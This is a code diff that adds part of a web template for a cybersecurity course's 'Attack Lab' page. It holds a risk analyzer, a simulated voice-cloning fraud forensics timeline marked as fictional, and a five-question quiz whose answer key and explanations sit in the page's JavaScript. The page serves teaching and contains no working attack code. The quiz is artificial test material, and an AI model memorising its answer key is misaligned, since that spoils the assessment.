+      <div id="risk-analysis-output" style="margin-top:16px;border-top:1px solid var(--border);padding-top:14px;">
+        <div style="font-size:0.85rem;color:var(--text-secondary);margin-bottom:8px;">
+          <strong>Target Scenario:</strong> <span id="res-scenario-title" style="color:var(--text-primary);">AI Voice Cloning Wire Fraud</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;font-size:0.8rem;margin-bottom:12px;">
+          <div style="background:var(--bg-card);padding:8px 10px;border-radius:4px;border:1px solid var(--border);">
+            <div style="color:var(--text-muted);font-size:0.72rem;">THREAT AGENT</div>
+            <div id="res-threat-agent" style="font-weight:600;color:var(--accent);">Organized cybercrime syndicate</div>
+          </div>
+          <div style="background:var(--bg-card);padding:8px 10px;border-radius:4px;border:1px solid var(--border);">
+            <div style="color:var(--text-muted);font-size:0.72rem;">CORE VULNERABILITY</div>
+            <div id="res-vulnerability" style="font-weight:600;color:var(--accent-2);">Single-channel verbal authorization</div>
+          </div>
+        </div>
+
+        <div style="font-size:0.8rem;font-weight:700;color:var(--text-primary);margin-bottom:4px;">
+          Prioritized Defensive Mitigations:
+        </div>
+        <ul id="res-mitigations-list" style="margin:0 0 0 16px;padding:0;font-size:0.78rem;color:var(--text-secondary);line-height:1.5;">
+          <li>Implement dual-custody approval thresholds for transactions &gt; ₹50,000.</li>
+          <li>Deploy VoiceShield AI acoustic signal verification on all executive voice calls.</li>
+          <li>Enforce out-of-band cryptographically signed verification tokens.</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 3: DIGITAL FORENSICS TIMELINE -->
+<div class="card mb-24 fade-in" id="lab-forensics-timeline">
+  <div class="card-header">
+    <div>
+      <span class="card-title">🔍 3. Digital Forensics Timeline: Operation SpoofedCaller</span>
+      <div style="font-size:0.8rem;color:var(--text-muted);margin-top:2px;">
+        Interactive reconstruction of a multi-stage cyber incident following NIST SP 800-61 Incident Handling procedures.
+      </div>
+    </div>
+    <span class="badge badge-warning">Simulated Educational Case Study</span>
+  </div>
+
+  <div style="background:rgba(245,158,11,0.08);border-left:3px solid var(--warning);padding:10px 14px;border-radius:var(--radius-sm);margin-bottom:14px;font-size:0.82rem;color:var(--text-secondary);">
+    ⚖️ <strong>Educational Simulation Notice:</strong> The logs, events (E-101 to E-106), cryptographic hashes, and artifacts below are entirely fictional and designed solely for classroom demonstration of NIST SP 800-61 incident response and Indian IT Act triage. This does not represent a real security breach or genuine evidence from an active voice-cloning detection system.
+  </div>
+
+  <p style="font-size:0.86rem;color:var(--text-secondary);line-height:1.6;margin-bottom:14px;">
+    <strong>Incident Scenario Briefing:</strong> At 11:03 UTC, a simulated vishing call targets a fictional corporate treasury desk. Review the simulated chronological timeline logs below. Click on any event to inspect its sample cryptographic hash, network artifacts, forensic verdict, and the corresponding incident-response phase.
+  </p>
+
+  <!-- Interactive Timeline Nodes -->
+  <div class="forensic-timeline-list">
+    <div class="forensic-node" id="node-E-101" onclick="loadForensicEvent('E-101')">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <span class="badge badge-secondary" style="font-family:monospace;">09:14 UTC</span>
+        <div>
+          <strong style="color:var(--text-primary);font-size:0.88rem;">E-101: VPN User Authentication</strong>
+          <div style="font-size:0.78rem;color:var(--text-muted);">Normal baseline authentication from authorized domestic IP</div>
+        </div>
+      </div>
+      <span class="badge badge-success" style="font-size:0.75rem;">Benign</span>
+    </div>
+
+    <div class="forensic-node" id="node-E-102" onclick="loadForensicEvent('E-102')">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <span class="badge badge-secondary" style="font-family:monospace;">11:03 UTC</span>
+        <div>
+          <strong style="color:var(--text-primary);font-size:0.88rem;">E-102: Inbound SIP VoIP Audio Packet Stream</strong>
+          <div style="font-size:0.78rem;color:var(--text-muted);">Spoofed CallerID claiming to be CTO requesting urgent wire transfer</div>
+        </div>
+      </div>
+      <span class="badge badge-warning" style="font-size:0.75rem;">Voice-Clone Detected</span>
+    </div>
+
+    <div class="forensic-node" id="node-E-103" onclick="loadForensicEvent('E-103')">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <span class="badge badge-secondary" style="font-family:monospace;">11:08 UTC</span>
+        <div>
+          <strong style="color:var(--text-primary);font-size:0.88rem;">E-103: Administrative Password Reset Triggered</strong>
+          <div style="font-size:0.78rem;color:var(--text-muted);">Self-service password reset initiated from anonymized Tor exit node</div>
+        </div>
+      </div>
+      <span class="badge badge-warning" style="font-size:0.75rem;">Anomalous</span>
+    </div>
+
+    <div class="forensic-node" id="node-E-104" onclick="loadForensicEvent('E-104')">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <span class="badge badge-secondary" style="font-family:monospace;">11:15 UTC</span>
+        <div>
+          <strong style="color:var(--text-primary);font-size:0.88rem;">E-104: ERP Financial Disbursement Attempt</strong>
+          <div style="font-size:0.78rem;color:var(--text-muted);">Staging of ₹4,50,000 transaction to unverified offshore IBAN</div>
+        </div>
+      </div>
+      <span class="badge badge-danger" style="font-size:0.75rem;">Critical Fraud Attempt</span>
+    </div>
+
+    <div class="forensic-node" id="node-E-105" onclick="loadForensicEvent('E-105')">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <span class="badge badge-secondary" style="font-family:monospace;">11:18 UTC</span>
+        <div>
+          <strong style="color:var(--text-primary);font-size:0.88rem;">E-105: Automated Security Containment Action</strong>
+          <div style="font-size:0.78rem;color:var(--text-muted);">VoiceShield AI &amp; SOC analyst revoke active sessions and quarantine host</div>
+        </div>
+      </div>
+      <span class="badge badge-info" style="font-size:0.75rem;">Containment</span>
+    </div>
+
+    <div class="forensic-node" id="node-E-106" onclick="loadForensicEvent('E-106')">
+      <div style="display:flex;align-items:center;gap:12px;">
+        <span class="badge badge-secondary" style="font-family:monospace;">11:45 UTC</span>
+        <div>
+          <strong style="color:var(--text-primary);font-size:0.88rem;">E-106: Forensic Evidence Vault Registration</strong>
+          <div style="font-size:0.78rem;color:var(--text-muted);">Bit-stream disk image and SIP captures registered with cryptographic hash</div>
+        </div>
+      </div>
+      <span class="badge badge-primary" style="font-size:0.75rem;">Forensic Custody</span>
+    </div>
+  </div>
+
+  <!-- Detailed Forensic Inspector Panel -->
+  <div class="forensic-inspector-panel" id="forensic-inspector">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;border-bottom:1px solid var(--border);padding-bottom:10px;">
+      <div>
+        <span id="inspect-event-id" class="badge badge-info" style="font-family:monospace;margin-right:8px;">E-102</span>
+        <strong id="inspect-event-title" style="font-size:1.02rem;color:var(--text-primary);">Inbound SIP VoIP Audio Packet</strong>
+      </div>
+      <span id="inspect-severity-badge" class="badge badge-warning">Suspicious</span>
+    </div>
+
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-bottom:12px;font-size:0.82rem;">
+      <div>
+        <span style="color:var(--text-muted);display:block;font-size:0.72rem;">TIMESTAMP (UTC):</span>
+        <code id="inspect-timestamp" style="color:var(--text-primary);">2026-10-26 11:03:45 UTC</code>
+      </div>
+      <div>
+        <span style="color:var(--text-muted);display:block;font-size:0.72rem;">NIST IR PHASE:</span>
+        <strong id="inspect-ir-phase" style="color:var(--accent);">Detection &amp; Analysis</strong>
+      </div>
+    </div>
+
+    <div class="lab-mockup" style="margin:10px 0;">
+      <div class="lab-mockup-header">
+        <span>📦 Network Artifact &amp; Cryptographic Hash</span>
+        <span style="color:#60a5fa;">SECURE CHAIN OF CUSTODY</span>
+      </div>
+      <code id="inspect-evidence-artifact" style="font-size:0.78rem;color:#e2e8f0;word-break:break-all;">
+        SIP Header: Spoofed CallerID | Acoustic Artifacts: Phase jitter | SHA-256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069
+      </code>
+    </div>
+
+    <div style="background:rgba(59,130,246,0.06);border-left:3px solid var(--accent);padding:10px 14px;border-radius:4px;margin-bottom:10px;font-size:0.84rem;line-height:1.5;">
+      <strong style="color:var(--text-primary);">Forensic Verdict:</strong>
+      <span id="inspect-verdict" style="color:var(--text-secondary);margin-left:4px;">
+        Voice-Cloning Indicators Detected. Acoustic analysis reveals synthetic vocoder phase artifacts.
+      </span>
+    </div>
+
+    <div style="background:rgba(34,197,94,0.06);border-left:3px solid var(--risk-low);padding:10px 14px;border-radius:4px;font-size:0.84rem;line-height:1.5;">
+      <strong style="color:var(--text-primary);">Mandatory Response Procedure:</strong>
+      <span id="inspect-action" style="color:var(--text-secondary);margin-left:4px;">
+        Initiate secondary out-of-band verification. Preserve raw .pcap and .wav with SHA-256 hash.
+      </span>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 4: CYBERSECURITY CHALLENGE ZONE -->
+<div class="card mb-24 fade-in" id="lab-challenges">
+  <div class="card-header">
+    <div>
+      <span class="card-title">🏆 4. Cybersecurity Challenge Zone</span>
+      <div style="font-size:0.8rem;color:var(--text-muted);margin-top:2px;">
+        Test knowledge across all syllabus modules and test readiness for the final examination.
+      </div>
+    </div>
+    <span class="badge badge-primary">Comprehensive Exam Hub</span>
+  </div>
+
+  <!-- Gateway Cards to Educational Units I–III -->
+  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px;margin-bottom:20px;">
+    <a href="{{ url_for('main.unit1') }}#sec-quiz" class="card" style="text-decoration:none;padding:16px;border:1px solid var(--border);transition:all var(--transition);display:block;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+        <span class="badge badge-info">Unit I</span>
+        <span style="font-size:0.8rem;color:var(--accent);">Take Quiz →</span>
+      </div>
+      <strong style="color:var(--text-primary);display:block;margin-bottom:4px;font-size:0.92rem;">Cybersecurity Fundamentals</strong>
+      <span style="font-size:0.78rem;color:var(--text-secondary);">CIA Triad, Malware Classifications, Intrusion Detection Systems (IDS), and Firewalls.</span>
+    </a>
+
+    <a href="{{ url_for('main.unit2') }}#sec-quiz" class="card" style="text-decoration:none;padding:16px;border:1px solid var(--border);transition:all var(--transition);display:block;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+        <span class="badge badge-info">Unit II</span>
+        <span style="font-size:0.8rem;color:var(--accent);">Take Quiz →</span>
+      </div>
+      <strong style="color:var(--text-primary);display:block;margin-bottom:4px;font-size:0.92rem;">Ethical Hacking &amp; Pentesting</strong>
+      <span style="font-size:0.78rem;color:var(--text-secondary);">5-Phase Methodology, Hacker Classifications, CVSS Metrics, and Responsible Disclosure.</span>
+    </a>
+
+    <a href="{{ url_for('main.unit3') }}#sec-quiz" class="card" style="text-decoration:none;padding:16px;border:1px solid var(--border);transition:all var(--transition);display:block;">
+      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
+        <span class="badge badge-info">Unit III</span>
+        <span style="font-size:0.8rem;color:var(--accent);">Take Quiz →</span>
+      </div>
+      <strong style="color:var(--text-primary);display:block;margin-bottom:4px;font-size:0.92rem;">Cyber Laws &amp; DPDP Act</strong>
+      <span style="font-size:0.78rem;color:var(--text-secondary);">IT Act 2000 (Sections 43, 66D, 70B), CERT-In 6-hour directions, and DPDP Act 2023.</span>
+    </a>
+  </div>
+
+  <!-- Synthesis Multi-Domain Challenge Quiz -->
+  <div style="background:var(--bg-surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
+      <div>
+        <h3 style="font-size:1.02rem;font-weight:700;color:var(--text-primary);margin:0;">
+          🎓 Attack Lab Synthesis Challenge (5 Questions)
+        </h3>
+        <span style="font-size:0.78rem;color:var(--text-muted);">Cross-domain practical questions evaluating technical &amp; legal understanding</span>
+      </div>
+      <div id="challenge-score-badge" class="badge badge-secondary" style="font-size:0.85rem;padding:6px 12px;">
+        Score: 0 / 5
+      </div>
+    </div>
+
+    <!-- CQ1 -->
+    <div class="mb-16" style="padding-bottom:12px;border-bottom:1px solid var(--border);">
+      <div style="font-weight:600;font-size:0.86rem;color:var(--text-primary);margin-bottom:6px;">
+        1. An attacker employs voice-cloning software to impersonate a company CFO and fraudulently induces the finance team to transfer funds. Under which section of the Indian IT Act 2000 is this specifically punishable?
+      </div>
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq1" value="a" style="margin-right:8px;"> A) Section 43A (Compensation for failure to protect data)</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq1" value="b" style="margin-right:8px;"> B) Section 66D (Cheating by personation by using computer resource)</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq1" value="c" style="margin-right:8px;"> C) Section 72 (Breach of confidentiality and privacy by authorized officer)</label>
+      </div>
+      <div id="cq1-feedback" style="display:none;font-size:0.8rem;margin-top:6px;padding:6px 10px;border-radius:4px;"></div>
+    </div>
+
+    <!-- CQ2 -->
+    <div class="mb-16" style="padding-bottom:12px;border-bottom:1px solid var(--border);">
+      <div style="font-weight:600;font-size:0.86rem;color:var(--text-primary);margin-bottom:6px;">
+        2. In forensic acquisition of a compromised web server's hard drive, what is the mandatory tool used to prevent any data modification on the original evidence drive?
+      </div>
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq2" value="a" style="margin-right:8px;"> A) Hardware or software Write-Blocker</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq2" value="b" style="margin-right:8px;"> B) Wireshark Packet Analyzer</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq2" value="c" style="margin-right:8px;"> C) Virtual Private Network tunnel</label>
+      </div>
+      <div id="cq2-feedback" style="display:none;font-size:0.8rem;margin-top:6px;padding:6px 10px;border-radius:4px;"></div>
+    </div>
+
+    <!-- CQ3 -->
+    <div class="mb-16" style="padding-bottom:12px;border-bottom:1px solid var(--border);">
+      <div style="font-weight:600;font-size:0.86rem;color:var(--text-primary);margin-bottom:6px;">
+        3. Which acoustic indicator is commonly observed in synthetic voice-cloned audio produced by neural vocoders?
+      </div>
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq3" value="a" style="margin-right:8px;"> A) Excessive natural room acoustic reverberation</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq3" value="b" style="margin-right:8px;"> B) Abnormally flat spectral distribution and lack of natural biological fundamental frequency (F0) micro-tremors</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq3" value="c" style="margin-right:8px;"> C) Extreme analog tape hiss and magnetic flutter</label>
+      </div>
+      <div id="cq3-feedback" style="display:none;font-size:0.8rem;margin-top:6px;padding:6px 10px;border-radius:4px;"></div>
+    </div>
+
+    <!-- CQ4 -->
+    <div class="mb-16" style="padding-bottom:12px;border-bottom:1px solid var(--border);">
+      <div style="font-weight:600;font-size:0.86rem;color:var(--text-primary);margin-bottom:6px;">
+        4. According to CERT-In directions (April 2022), within what timeframe must cybersecurity incidents be reported to CERT-In?
+      </div>
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq4" value="a" style="margin-right:8px;"> A) Within 6 hours of noticing or being brought to notice of the incident</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq4" value="b" style="margin-right:8px;"> B) Within 30 calendar days</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq4" value="c" style="margin-right:8px;"> C) Only at the end of the fiscal year</label>
+      </div>
+      <div id="cq4-feedback" style="display:none;font-size:0.8rem;margin-top:6px;padding:6px 10px;border-radius:4px;"></div>
+    </div>
+
+    <!-- CQ5 -->
+    <div class="mb-16" style="padding-bottom:12px;">
+      <div style="font-weight:600;font-size:0.86rem;color:var(--text-primary);margin-bottom:6px;">
+        5. What is the single most effective coding practice to permanently remediate SQL Injection vulnerabilities?
+      </div>
+      <div style="display:flex;flex-direction:column;gap:6px;">
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq5" value="a" style="margin-right:8px;"> A) Removing all spaces from user inputs using regex</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq5" value="b" style="margin-right:8px;"> B) Using Parameterized Queries (Prepared Statements) with strong data typing</label>
+        <label class="form-check" style="font-size:0.82rem;cursor:pointer;"><input type="radio" name="cq5" value="c" style="margin-right:8px;"> C) Storing the database in plain text files</label>
+      </div>
+      <div id="cq5-feedback" style="display:none;font-size:0.8rem;margin-top:6px;padding:6px 10px;border-radius:4px;"></div>
+    </div>
+
+    <div style="display:flex;gap:10px;margin-top:16px;">
+      <button class="btn btn-primary" onclick="submitSynthesisChallenge()">Submit All Answers</button>
+      <button class="btn btn-secondary" onclick="resetSynthesisChallenge()">Reset Challenge</button>
+    </div>
+  </div>
+</div>
+
+<!-- JAVASCRIPT LOGIC FOR ATTACK LAB -->
+<script>
+// -------------------------------------------------------------
+// A. ATTACK SIMULATOR EVALUATION
+// -------------------------------------------------------------
+function evaluateScenario(qId, correctVal) {
+  const selected = document.querySelector('input[name="' + qId + '_choice"]:checked');
+  const explanationBox = document.getElementById(qId + '-explanation');
+  const verdictElem = document.getElementById(qId + '-verdict');
+
+  if (!selected) {
+    alert("Please select an answer option before submitting.");
+    return;
+  }
+
+  explanationBox.style.display = 'block';
+
+  if (selected.value === correctVal) {
+    verdictElem.innerHTML = '✅ Correct Identification! Excellent threat triage.';
+    verdictElem.style.color = '#4ade80';
+  } else {
+    verdictElem.innerHTML = '❌ Incorrect. Review the explanation and key indicators below:';
+    verdictElem.style.color = '#f87171';
+  }
+}
+
+function resetScenario(qId) {
+  const inputs = document.querySelectorAll('input[name="' + qId + '_choice"]');
+  inputs.forEach(input => input.checked = false);
+  const explanationBox = document.getElementById(qId + '-explanation');
+  if (explanationBox) {
+    explanationBox.style.display = 'none';
+  }
+}
+
+// -------------------------------------------------------------
+// B. THREAT RISK ANALYZER
+// -------------------------------------------------------------
+const SCENARIO_PRESETS = {
+  "voice_cloning_wire_fraud": { l: 4, i: 5 },
+  "sql_injection_exfiltration": { l: 3, i: 4 },
+  "spear_phishing_credential_theft": { l: 5, i: 4 },
+  "ransomware_lateral_spread": { l: 3, i: 5 },
+  "insider_data_leak": { l: 2, i: 4 },
+  "custom": { l: 3, i: 3 }
+};
+
+function handleScenarioSelectionChange() {
+  const sel = document.getElementById("analyzer-scenario-select").value;
+  const customGroup = document.getElementById("custom-scenario-group");
+  if (sel === "custom") {
+    customGroup.style.display = "block";
+  } else {
+    customGroup.style.display = "none";
+    const preset = SCENARIO_PRESETS[sel];
+    if (preset) {
+      document.getElementById("analyzer-likelihood").value = preset.l;
+      document.getElementById("analyzer-impact").value = preset.i;
+      updateSliderDisplay();
+    }
+  }
+}
+
+function updateSliderDisplay() {
+  const l = document.getElementById("analyzer-likelihood").value;
+  const i = document.getElementById("analyzer-impact").value;
+  document.getElementById("likelihood-val-display").innerText = l + " / 5";
+  document.getElementById("impact-val-display").innerText = i + " / 5";
+}
+
+function renderMatrixGrid(activeScore) {
+  const container = document.getElementById("matrix-grid-container");
+  container.innerHTML = "";
+
+  // 5 rows: Impact from 5 down to 1
+  for (let imp = 5; imp >= 1; imp--) {
+    // 5 cols: Likelihood from 1 to 5
+    for (let lik = 1; lik <= 5; lik++) {
+      const cellScore = imp * lik;
+      const cell = document.createElement("div");
+      cell.className = "matrix-cell";
+      
+      if (cellScore <= 4) {
+        cell.classList.add("cell-low");
+      } else if (cellScore <= 9) {
+        cell.classList.add("cell-medium");
+      } else if (cellScore <= 15) {
+        cell.classList.add("cell-high");
+      } else {
+        cell.classList.add("cell-critical");
+      }
+
+      cell.innerText = cellScore;
+      cell.title = "Likelihood: " + lik + ", Impact: " + imp + " = Score: " + cellScore;
+
+      if (cellScore === activeScore) {
+        cell.classList.add("active-score");
+      }
+
+      container.appendChild(cell);
+    }
+  }
+}
+
+async function runThreatRiskAnalysis() {
+  const scenarioKey = document.getElementById("analyzer-scenario-select").value;
+  const customDesc = document.getElementById("analyzer-custom-text").value;
+  const likelihood = parseInt(document.getElementById("analyzer-likelihood").value, 10);
+  const impact = parseInt(document.getElementById("analyzer-impact").value, 10);
+
+  const controls = [];
+  if (document.getElementById("ctrl-mfa").checked) controls.push("mfa");
+  if (document.getElementById("ctrl-segmentation").checked) controls.push("segmentation");
+  if (document.getElementById("ctrl-backups").checked) controls.push("backups");
+  if (document.getElementById("ctrl-training").checked) controls.push("training");
+
+  const payload = {
+    scenario_key: scenarioKey,
+    custom_desc: customDesc,
+    likelihood: likelihood,
+    impact: impact,
+    controls: controls
+  };
+
+  try {
+    const res = await fetch("{{ url_for('main.attack_lab_analyze_risk') }}", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    const data = await res.json();
+    if (data.status === "success") {
+      // Update UI
+      const badge = document.getElementById("risk-tier-badge");
+      badge.innerText = data.tier.toUpperCase() + " (Score: " + data.score + ")";
+      badge.style.backgroundColor = data.tier_color;
+
+      document.getElementById("res-scenario-title").innerText = data.scenario_title;
+      document.getElementById("res-threat-agent").innerText = data.threat_agent;
+      document.getElementById("res-vulnerability").innerText = data.vulnerability;
+
+      const mitigationsList = document.getElementById("res-mitigations-list");
+      mitigationsList.innerHTML = "";
+      data.mitigations.forEach(item => {
+        const li = document.createElement("li");
+        li.innerText = item;
+        mitigationsList.appendChild(li);
+      });
+
+      renderMatrixGrid(data.score);
+    }
+  } catch (err) {
+    console.error("Risk analysis fetch failed:", err);
+  }
+}
+
+// -------------------------------------------------------------
+// C. DIGITAL FORENSICS TIMELINE
+// -------------------------------------------------------------
+async function loadForensicEvent(eventId) {
+  // Highlight node
+  document.querySelectorAll(".forensic-node").forEach(node => node.classList.remove("selected"));
+  const activeNode = document.getElementById("node-" + eventId);
+  if (activeNode) activeNode.classList.add("selected");
+
+  try {
+    const res = await fetch("{{ url_for('main.attack_lab_forensics_event') }}", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ event_id: eventId })
+    });
+
+    const data = await res.json();
+    if (data.status === "success") {
+      const panel = document.getElementById("forensic-inspector");
+      panel.classList.add("show");
+
+      document.getElementById("inspect-event-id").innerText = data.event_id;
+      document.getElementById("inspect-event-title").innerText = data.event_type;
+      
+      const badge = document.getElementById("inspect-severity-badge");
+      badge.innerText = data.severity;
+      if (data.severity === "Benign") {
+        badge.className = "badge badge-success";
+      } else if (data.severity === "Critical") {
+        badge.className = "badge badge-danger";
+      } else if (data.severity === "Suspicious" || data.severity === "Anomalous") {
+        badge.className = "badge badge-warning";
+      } else {
+        badge.className = "badge badge-info";
+      }
+
+      document.getElementById("inspect-timestamp").innerText = data.timestamp;
+      document.getElementById("inspect-ir-phase").innerText = data.ir_phase;
+      document.getElementById("inspect-evidence-artifact").innerText = data.evidence_artifact;
+      document.getElementById("inspect-verdict").innerText = data.forensic_verdict;
+      document.getElementById("inspect-action").innerText = data.recommended_action;
+
+      // Scroll smoothly to inspector if offscreen
+      panel.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+    }
+  } catch (err) {
+    console.error("Forensics fetch error:", err);
+  }
+}
+
+// -------------------------------------------------------------
+// D. CYBERSECURITY CHALLENGE ZONE LOGIC
+// -------------------------------------------------------------
+const CHALLENGE_ANSWERS = {
+  cq1: { correct: 'b', exp: 'Section 66D IT Act 2000 provides imprisonment up to 3 years and fine up to ₹1,00,000 for cheating by personation using a computer resource.' },
+  cq2: { correct: 'a', exp: 'Write-blockers (hardware or software) guarantee that read-only access is enforced and not a single bit of the original digital evidence is modified.' },
+  cq3: { correct: 'b', exp: 'Neural vocoders synthesise speech by predicting waveform frames, frequently lacking biological vocal cord micro-tremors and exhibiting elevated spectral flatness.' },
+  cq4: { correct: 'a', exp: 'CERT-In mandatory directions dated 28 April 2022 require designated cybersecurity incidents to be reported within 6 hours of noticing.' },
+  cq5: { correct: 'b', exp: 'Parameterized queries compile the query structure first, treating user parameters strictly as literal values and completely neutralizing SQL injection.' }
+};
+
+function submitSynthesisChallenge() {
+  let score = 0;
+  for (const [qKey, data] of Object.entries(CHALLENGE_ANSWERS)) {
+    const selected = document.querySelector('input[name="' + qKey + '"]:checked');
+    const feedbackElem = document.getElementById(qKey + '-feedback');
+    feedbackElem.style.display = 'block';
+
+    if (selected && selected.value === data.correct) {
+      score++;
+      feedbackElem.style.background = 'rgba(34,197,94,0.1)';
+      feedbackElem.style.color = '#4ade80';
+      feedbackElem.style.border = '1px solid rgba(34,197,94,0.3)';
+      feedbackElem.innerHTML = '✅ Correct! ' + data.exp;
+    } else {
+      feedbackElem.style.background = 'rgba(239,68,68,0.1)';
+      feedbackElem.style.color = '#f87171';
+      feedbackElem.style.border = '1px solid rgba(239,68,68,0.3)';
+      feedbackElem.innerHTML = '❌ Incorrect. Correct answer: Option ' + data.correct.toUpperCase() + '. ' + data.exp;
+    }
+  }
+
+  const scoreBadge = document.getElementById("challenge-score-badge");
+  scoreBadge.innerText = 'Score: ' + score + ' / 5 (' + (score * 20) + '%)';
+  if (score >= 4) {
+    scoreBadge.className = 'badge badge-success';
+  } else if (score >= 3) {
+    scoreBadge.className = 'badge badge-warning';
+  } else {
+    scoreBadge.className = 'badge badge-danger';
+  }
+}
+
+function resetSynthesisChallenge() {
+  for (const qKey of Object.keys(CHALLENGE_ANSWERS)) {
+    const inputs = document.querySelectorAll('input[name="' + qKey + '"]');
+    inputs.forEach(input => input.checked = false);
+    const feedback = document.getElementById(qKey + '-feedback');
+    if (feedback) feedback.style.display = 'none';
+  }
+  const scoreBadge = document.getElementById("challenge-score-badge");
+  scoreBadge.innerText = 'Score: 0 / 5';
+  scoreBadge.className = 'badge badge-secondary';
+}
+
+// Initial boot
+document.addEventListener("DOMContentLoaded", function() {
+  renderMatrixGrid(20);
+});
+</script>
+{% endblock %}
